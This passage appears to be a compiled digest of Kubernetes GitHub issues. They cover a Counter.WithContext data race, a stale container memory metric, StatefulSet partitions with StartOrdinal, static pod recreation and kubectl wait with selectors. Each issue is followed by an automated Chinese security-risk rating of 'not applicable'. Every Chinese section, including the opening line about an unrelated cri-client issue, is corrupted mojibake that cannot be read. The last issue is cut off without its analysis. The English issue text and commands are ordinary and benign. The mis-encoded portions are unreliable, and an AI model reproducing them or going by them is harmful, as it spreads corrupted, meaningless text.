æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œè¯¥Issueåæ˜ äº†cri-clientä»“åº“ä¸­ç¼ºå°‘æ—§ç‰ˆæœ¬æ ‡ç­¾çš„é—®é¢˜ï¼Œå¯¼è‡´æ— æ³•è®¿é—®æ—§ç‰ˆæœ¬çš„ä»£ç ã€‚è¿™å±äºç‰ˆæœ¬ç®¡ç†å’Œä»“åº“ç»´æŠ¤çš„é—®é¢˜ï¼Œå¹¶ä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚æ²¡æœ‰æ½œåœ¨çš„æ¼æ´å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¹Ÿæ²¡æœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–é«˜é£é™©çš„æ¼æ´å­˜åœ¨ã€‚å› æ­¤ï¼Œ**é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚

---

## Issue #128548 Counter.WithContext: data race

- Issue é“¾æ¥ï¼š[#128548](https://github.com/kubernetes/kubernetes/issues/128548)

### Issue å†…å®¹

#### What happened?

I ran integration tests with race detection enabled (https://github.com/kubernetes/kubernetes/pull/116980).

k8s.io/kubernetes/test/integration/storageversionmigrator failed with a data race (https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/116980/pull-kubernetes-integration/1853468672903876608):

```
Write at 0x00c000514d20 by goroutine 326096:
  k8s.io/component-base/metrics.(*Counter).WithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/component-base/metrics/counter.go:110 +0xb5e
  k8s.io/apiserver/pkg/audit.ObserveEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/audit/metrics.go:89 +0xb40
  k8s.io/apiserver/pkg/endpoints/filters.processAuditEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:197 +0xb3f
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:113 +0x6fe
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x23c
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xd01
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x4b5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3

Previous write at 0x00c000514d20 by goroutine 326108:
  k8s.io/component-base/metrics.(*Counter).WithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/component-base/metrics/counter.go:110 +0xb5e
  k8s.io/apiserver/pkg/audit.ObserveEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/audit/metrics.go:89 +0xb40
  k8s.io/apiserver/pkg/endpoints/filters.processAuditEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:197 +0xb3f
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:113 +0x6fe
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x23c
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xd01
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x4b5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3
```


#### What did you expect to happen?

No race.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the integration test with `go test -race`.

#### Anything else we need to know?

This was introduced in https://github.com/kubernetes/kubernetes/pull/119949 three weeks ago.

/sig instrumentation
/cc @rexagod 

#### Kubernetes version

master (soon 1.32)

#### Cloud provider

n/a


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨æ‰§è¡Œå¸¦æœ‰ç«äº‰æ£€æµ‹çš„é›†æˆæµ‹è¯•æ—¶ï¼Œå‡ºç°äº†æ•°æ®ç«äº‰ã€‚æ•°æ®ç«äº‰å¯èƒ½å¯¼è‡´ç¨‹åºçš„ä¸ç¡®å®šè¡Œä¸ºï¼Œå¦‚å´©æºƒæˆ–æ•°æ®æŸåï¼Œä½†å¹¶éæ‰€æœ‰çš„æ•°æ®ç«äº‰éƒ½æ„æˆå®‰å…¨é£é™©ã€‚æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¯¥æ•°æ®ç«äº‰å‘ç”Ÿåœ¨`k8s.io/component-base/metrics.(*Counter).WithContext()`ä¸­ï¼Œè¿™æ˜¯ç”¨äºè®¡æ•°å™¨çš„ä¸Šä¸‹æ–‡å¤„ç†ã€‚æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ•°æ®ç«äº‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€æå‡æƒé™æˆ–å¯¼è‡´å…¶ä»–é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œé™¤éèƒ½å¤Ÿè¯æ˜è¯¥æ•°æ®ç«äº‰å¯è¢«æ”»å‡»è€…åˆ©ç”¨å¹¶å¯¼è‡´é«˜é£é™©çš„æ¼æ´ï¼Œå¦åˆ™ä¸åº”å°†å…¶è§†ä¸ºå®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128538 container_memory_working_set_bytes shows previous container memory

- Issue é“¾æ¥ï¼š[#128538](https://github.com/kubernetes/kubernetes/issues/128538)

### Issue å†…å®¹

#### What happened?

As raised at https://github.com/prometheus-operator/kube-prometheus/issues/2522, the `container_memory_working_set_bytes` metric shows memory from a killed container instance which is not running anymore, not allowing to use it to know the "real" memory usage.

In my case, I still see the last memory used by the previous container instance for 4:30 minutes, but from @vladmalynych I see in his case it seems to be only for around 3 minutes.

#### What did you expect to happen?

To only show data from the **current** running container.

#### How can we reproduce it (as minimally and precisely as possible)?

Trigger a container restart (OOMKilled or Eviction) and check the resulting metric.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.1-gke.1678000 (Also happening in 1.29.8-gke.1211000)
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux gke-*** 5.15.0-1067-gke #73-Ubuntu SMP Sat Aug 31 04:29:32 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å®¹å™¨è¢«æ€æ­»ï¼ˆå¦‚OOMKilledæˆ–Evictionï¼‰åï¼ŒæŒ‡æ ‡`container_memory_working_set_bytes`ä»ç„¶æ˜¾ç¤ºå·²è¢«æ€æ­»çš„å®¹å™¨å®ä¾‹çš„å†…å­˜æ•°æ®ï¼ŒæŒç»­æ—¶é—´çº¦ä¸º3åˆ°4.5åˆ†é’Ÿã€‚è¿™å¯èƒ½å¯¼è‡´ç›‘æ§æ•°æ®ä¸å‡†ç¡®ï¼Œå½±å“å¯¹ç³»ç»Ÿèµ„æºçš„å®æ—¶ç›‘æ§å’Œç®¡ç†ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜å¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼š

1. **è¯¥é£é™©ä¸èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤é—®é¢˜ä»…å½±å“ç›‘æ§æ•°æ®çš„å‡†ç¡®æ€§ï¼Œå¹¶ä¸æä¾›æ”»å‡»è€…åˆ©ç”¨çš„é€”å¾„ã€‚
2. **è¯¥é£é™©ä¸å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·**ï¼šæ­¤é—®é¢˜ä¸ä¼šå¯¼è‡´ç³»ç»Ÿè¢«æ”»ç ´æˆ–æƒé™æå‡ï¼Œä¸ç¬¦åˆCVEçš„åˆ†é…æ ‡å‡†ã€‚
6. **Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚

å› æ­¤ï¼Œæ ¹æ®ä»¥ä¸Šåˆ†æï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128536 Unit tests support testing the passed path and its sub paths

- Issue é“¾æ¥ï¼š[#128536](https://github.com/kubernetes/kubernetes/issues/128536)

### Issue å†…å®¹

#### What happened?

The current unit tests support running all test cases with `make test`; and `make check WHAT=./pkg/kubelet GOFLAGS=-v`, which will execute all test cases under the path `./pkg/kubelet` but not include those in its subdirectories. If you modify the code in multiple subdirectories of `pkg/kubelet`, and if you want to run unit tests, you need to explicitly import each subdirectory. This can be inconvenient and may lead to overlooking some test cases.


#### What did you expect to happen?

Therefore, we need something like a switch to allow running all test cases from the desired directory and its subdirectories, for example: `make test WHAT="pkg/kubelet" GOFLAGS=-v KUBE_SUBDIR=y`. If `KUBE_SUBDIR` is set to y or Y, all tests within `pkg/kubelet` and its subdirectories will be executed; otherwise, only the test cases within `pkg/kubelet` will be run.


#### How can we reproduce it (as minimally and precisely as possible)?

```
make check WHAT=./pkg/kubelet GOFLAGS=-v
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
é€šè¿‡å¯¹Issueå†…å®¹çš„åˆ†æï¼Œè¯¥Issueæå‡ºäº†ä¸€ä¸ªå…³äºæ”¹è¿›å•å…ƒæµ‹è¯•è¿è¡Œæ–¹å¼çš„å»ºè®®ï¼Œå³æ·»åŠ ä¸€ä¸ªå¼€å…³ï¼Œä½¿å¾—åœ¨æ‰§è¡Œå•å…ƒæµ‹è¯•æ—¶ï¼Œå¯ä»¥é€’å½’åœ°è¿è¡ŒæŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹ã€‚è¿™ä¸ªæ”¹è¿›æ—¨åœ¨æé«˜å¼€å‘è€…çš„æµ‹è¯•æ•ˆç‡ï¼Œé¿å…é—æ¼æµ‹è¯•ç”¨ä¾‹ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šè¯¥Issueä¸æ¶‰åŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„é£é™©ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šä¸å­˜åœ¨å¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚
3. **issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©**ï¼šä¸é€‚ç”¨ã€‚
4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†**ï¼šä¸æ¶‰åŠã€‚
5. **å¯¹äºæ—¥å¿—ä¸­æ³„éœ²å‡­æ®çš„é£é™©**ï¼šä¸æ¶‰åŠã€‚
6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ï¼šç¬¦åˆæ­¤æ¡ã€‚

å› æ­¤ï¼Œç»¼åˆåˆ¤æ–­ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128529 Inconsistency of Partitions in StatefulSets with StartOrdinal Feature

- Issue é“¾æ¥ï¼š[#128529](https://github.com/kubernetes/kubernetes/issues/128529)

### Issue å†…å®¹

#### What happened?

StatefulSet with 
```
Replicas 9
StartOrdinal 2
Partition 5
```

we will get 
[2,3,4,5,6] current revision
[7,8,9,10] updated revision

#### What did you expect to happen?

If I understand the partition with definition
https://github.com/kubernetes/kubernetes/blob/3036d107a0ee4855b992e9f49eded88e0a739734/staging/src/k8s.io/api/apps/v1/types.go#L117-L122

I will get
[2,3,4] current revision
[5,6,7,8,9,10] updated revision

Or we can define partition as the number of pods with current revision.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a sts with partition 9 and start ordinal 2
```
apiVersion: apps/v1
kind: StatefulSet
metadata:
  creationTimestamp: "2024-09-12T03:06:27Z"
  generation: 1
  name: ss2
  resourceVersion: "23988"
  uid: d556aa7c-c4da-4676-8caa-4b32db831c37
spec:
  podManagementPolicy: OrderedReady
  replicas: 9
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      baz: blah
      foo: bar
  serviceName: test
  ordinals: 
    start: 2
  template:
    metadata:
      labels:
        baz: blah
        foo: bar
    spec:
      containers:
      - image: xxxx
        imagePullPolicy: IfNotPresent
        name: nginx
        resources: {}
  updateStrategy:
    rollingUpdate:
      maxUnavailable: 1
      partition: 0
    type: RollingUpdate

```

2. update the sts and set partition as 5

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.7
```

</details>


#### Cloud provider

<details>
kind
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
KCM
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæè¿°äº†åœ¨StatefulSetä¸­ä½¿ç”¨StartOrdinalç‰¹æ€§æ—¶ï¼ŒPartitionçš„è¡Œä¸ºä¸ä¸€è‡´çš„é—®é¢˜ã€‚è¿™æ¶‰åŠåˆ°StatefulSetçš„æ›´æ–°ç­–ç•¥å’ŒPodçš„åºå·ç®¡ç†ã€‚æ ¹æ®Issueå†…å®¹ï¼Œè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å®ç°ä¸Šçš„é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´é›†ç¾¤ä¸­Podçš„æ›´æ–°é¡ºåºæˆ–æ•°é‡ä¸ç¬¦åˆé¢„æœŸã€‚ä½†ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™å¹¶ä¸æ„æˆæ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¯¥é—®é¢˜æ¥è¿›è¡Œæ”»å‡»ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æƒé™æå‡ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #128528 Whether the master node should be stripped out of the logic of disruption in node-lifecycle-controller?

- Issue é“¾æ¥ï¼š[#128528](https://github.com/kubernetes/kubernetes/issues/128528)

### Issue å†…å®¹

#### What happened?

Yesterday, I tested changing the status of all worker nodes to NotReady in order to verify the speed limiting logic in large-scale cluster failures. But when all worker nodes in a single availability zone (I only have one availability zone) are NotReady, they will not enter the single availability zone ` FullyDisruption` state.
If the master node is NotReady, it will cause kube-controller-manager  pod notReady, and the logic cannot continue to be processed. So why should the master node be included in the logic of the `Disruption` function?

#### What did you expect to happen?

When determining the `Disruption` function, the master node is not considered. Master node notready will cause pod not Ready.

#### How can we reproduce it (as minimally and precisely as possible)?

1.create a kubernetes cluster.
2.create >3 master node.
3.create some worker node.
make worker node notReady.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueè®¨è®ºäº†åœ¨Kubernetesé›†ç¾¤ä¸­ï¼Œå½“æ‰€æœ‰å·¥ä½œèŠ‚ç‚¹ï¼ˆworker nodeï¼‰å˜ä¸ºNotReadyçŠ¶æ€æ—¶ï¼Œç”±äºä¸»èŠ‚ç‚¹ï¼ˆmaster nodeï¼‰è¢«åŒ…å«åœ¨`Disruption`å‡½æ•°çš„é€»è¾‘ä¸­ï¼Œå¯¼è‡´ä¸ä¼šè¿›å…¥`FullyDisruption`çŠ¶æ€ã€‚æå‡ºäº†æ˜¯å¦åº”å°†ä¸»èŠ‚ç‚¹ä»`Disruption`é€»è¾‘ä¸­å‰”é™¤çš„é—®é¢˜ã€‚

æ­¤Issueä¸»è¦å…³æ³¨çš„æ˜¯KubernetesèŠ‚ç‚¹ç®¡ç†é€»è¾‘çš„è¡Œä¸ºï¼Œå¯¹èŠ‚ç‚¹çŠ¶æ€å˜æ›´æ—¶é›†ç¾¤çš„å“åº”è¿›è¡Œäº†æ¢è®¨ã€‚Issueä¸­å¹¶æœªæåŠä»»ä½•å¯ä»¥è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠæƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜å±å®‰å…¨é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šIssueä¸­æ²¡æœ‰æè¿°ä»»ä½•æ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„é£é™©ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šä¸å­˜åœ¨å¯èƒ½è¢«åˆ†é…CVEç¼–å·çš„æ¼æ´ã€‚
3. **Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©**ï¼šä¸å­˜åœ¨æ­¤ç±»é—®é¢˜ã€‚
6. **å¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128524 use kubectl delete static pod, pod can't recreate

- Issue é“¾æ¥ï¼š[#128524](https://github.com/kubernetes/kubernetes/issues/128524)

### Issue å†…å®¹

#### What happened?

I having a kube-scheduler static pod, configuration a kubescheduler-config.yaml to pod, i change this file in node, then exec `kubectl -n kube-system delete pods {scheduler-pod}`, then the pod is restarted. but i found kube-scheduler pod not using the latest configuration file.

#### What did you expect to happen?

I hope exec  `kubectl -n kube-system delete pods {scheduler-pod}` after, can create a new static pod. use latest configuration file.

#### How can we reproduce it (as minimally and precisely as possible)?

1. change `KubeSchedulerConfiguration` this config.
2. exec `kubectl -n kube-system delete pods {scheduler-pod}`.
3. found kube-scheduler pod use old config file.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†æ›´æ”¹kube-scheduleré™æ€Podçš„é…ç½®æ–‡ä»¶åï¼Œæ‰§è¡Œ`kubectl delete pod`åˆ é™¤Podï¼Œå‘ç°Podæœªä½¿ç”¨æœ€æ–°çš„é…ç½®æ–‡ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªé…ç½®æ›´æ–°çš„é—®é¢˜ï¼Œå¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬3æ¡ï¼ŒIssueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­ä¸å½“æ“ä½œæˆ–é…ç½®å¼•èµ·çš„é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128515 kubectl wait --for=create doesn't work with selectors

- Issue é“¾æ¥ï¼š[#128515](https://github.com/kubernetes/kubernetes/issues/128515)

### Issue å†…å®¹

#### What happened?

This works:

```
kubectl wait --for=create someresourcetype/resource
```

But for generated resources where we need to filter, this immediately exits with `error: no matching resources found`:

```
kubectl wait --for=create someresourcetype -l somelabel
```

#### What did you expect to happen?

I'd expect `kubectl wait --for=create` to still wait when used with `-l`. Otherwise we're back to hacky sleeps and bash loops in cases where resource names are unknown (i.e. generated).

#### How can we reproduce it (as minimally and precisely as possible)?

```bash
#!/bin/bash
set -xeuo pipefail

# This works as expected.
(
sleep 1 && cat <<EOF | kubectl create -f - >/dev/null 2>&1
apiVersion: v1
kind: ConfigMap
metadata:
  name: unlabeled-cm
data:
  key: value
EOF
) & pid=$!

kubectl wait --for=create configmap/unlabeled-cm --timeout=10s || true

wait $pid

# This fails, since the filter failure seems to cause an early exit.
(
sleep 1 && cat <<EOF | kubectl create -f - >/dev/null 2>&1
apiVersion: v1
kind: ConfigMap
metadata:
  name: labeled-cm
  labels:
    hello: world
data:
  key: value
EOF
) & pid=$!

kubectl wait --for=create configmap -l hello=world --timeout=10s || true

wait $pid

# This works again, since the configmap now exists.
kubectl wait --for=create configmap -l hello=world --timeout=10s || true

kubectl delete configmap unlabeled-cm labeled-cm
```

#### Anything else we need to know?

I didn't test anything other than `-l`, but other filtering mechanisms might be broken with `--for=create` as well.

